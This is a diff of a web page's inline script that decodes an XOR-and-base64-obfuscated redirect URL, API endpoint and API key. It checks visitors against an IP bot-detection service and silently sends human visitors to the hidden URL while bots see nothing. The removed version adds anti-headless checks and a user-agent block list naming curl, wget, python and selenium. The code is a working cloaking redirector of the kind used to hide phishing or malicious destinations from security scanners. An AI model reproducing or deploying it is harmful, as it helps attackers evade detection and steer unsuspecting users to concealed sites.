@@ -22,110 +22,76 @@
 </div>
 
 <script>
-/*
-  FINAL VERSION:
-  - URL encrypted
-  - API endpoint encrypted
-  - API key encrypted
-  - IPDetective request BEFORE redirect
-  - Anti-headless, anti-bot
-*/
-
 (function(){
 
-  
   const XORKEY = 137;
 
-  
   const ENC_URL = "4f39+fqzpqbk7OPg4vzh4Ovg5+D8p+7l7Ozz7Kfq5uSm7uamvLrr7bm8u+8=";
-
-  
   const ENC_API = "4/Hr7eCvr6jk7eTu6/Dg6uP07/H87f7l4+v37b3i6PXm7uGmwLbo7rmtsNf/8OQ=";
-
-
   const ENC_KEY = "4e/o6uXrreLw6+Li5vHb5eP86f/o7eP47vDu4vXv6PLh6ebkz+Hu7PyGuQ==";
 
-
-  
   function b64Bytes(b){
     const bin = atob(b), L = bin.length, arr = new Uint8Array(L);
     for(let i=0;i<L;i++) arr[i] = bin.charCodeAt(i);
     return arr;
   }
 
-  
   function xor(bytes){
     const out = new Uint8Array(bytes.length);
     for(let i=0;i<bytes.length;i++) out[i] = bytes[i] ^ XORKEY;
     return out;
   }
 
-  // Uint8Array → String
   function toStr(bytes){
     try{return new TextDecoder().decode(bytes);}catch(e){
-      let s="";for(let i=0;i<bytes.length;i++) s+=String.fromCharCode(bytes[i]);
+      let s=""; for(let i=0;i<bytes.length;i++) s+=String.fromCharCode(bytes[i]);
       return decodeURIComponent(escape(s));
     }
   }
 
-  
-  function looksLikeBot(){
-    try{
-      if(navigator.webdriver) return true;
-      if(navigator.plugins.length===0 && (!navigator.languages || navigator.languages.length===0)) return true;
-
-      const ua = navigator.userAgent.toLowerCase();
-      const block = ["headless","phantom","curl","wget","python","node","mediapartners","selenium"];
-      if(block.some(x=>ua.includes(x))) return true;
-
-      if(screen.width<=200 || screen.height<=200){
-        if(!navigator.languages || navigator.languages.length===0) return true;
-      }
-    }catch(e){}
-    return false;
+  const wrap = document.getElementById("wrap");
+  function showSpinner(){
+    wrap.style.opacity = 1;
+    wrap.style.pointerEvents = "auto";
   }
 
-  // SHOW SPINNER
-  const wrap = document.getElementById("wrap");
-  function show(){wrap.style.opacity=1;wrap.style.pointerEvents="auto";}
-
   async function main(){
-    
-    if(looksLikeBot()) return;
-
-    show();
-
-    const delay = Math.floor(Math.random()*(1200-500+1))+500;
-    await new Promise(r=>setTimeout(r,delay));
-
-    
     const API_URL = toStr(xor(b64Bytes(ENC_API)));
     const API_KEY = toStr(xor(b64Bytes(ENC_KEY)));
 
+    let data = null;
+
     try{
-      const res = await fetch(API_URL,{
+      const res = await fetch(API_URL, {
         method:"GET",
         cache:"no-store",
         headers:{
-          "x-api-key":API_KEY,
+          "x-api-key": API_KEY,
           "Accept":"application/json",
-          "X-Req":Math.random().toString(36).slice(2)
+          "X-Req": Math.random().toString(36).slice(2)
         }
       });
 
       if(!res.ok) return;
 
-      const data = await res.json().catch(()=>null);
+      data = await res.json().catch(()=>null);
       if(!data) return;
 
-      // Jika IPDetective bilang "bot": TIDAK redirect
-      if(data.bot === true) return;
+    }catch(e){
+      return;
+    }
 
-      // Jika aman → redirect
-      const URL = toStr(xor(b64Bytes(ENC_URL)));
-      if(URL.startsWith("http")) location.replace(URL);
+    if(data.bot === true) return;
 
-    }catch(e){}
+    showSpinner();
+
+    await new Promise(r=>setTimeout(r, 400 + Math.random()*500));
+
+    const REAL_URL = toStr(xor(b64Bytes(ENC_URL)));
+
+    if(REAL_URL.startsWith("http")){
+      location.replace(REAL_URL);
+    }
   }
 
   main();
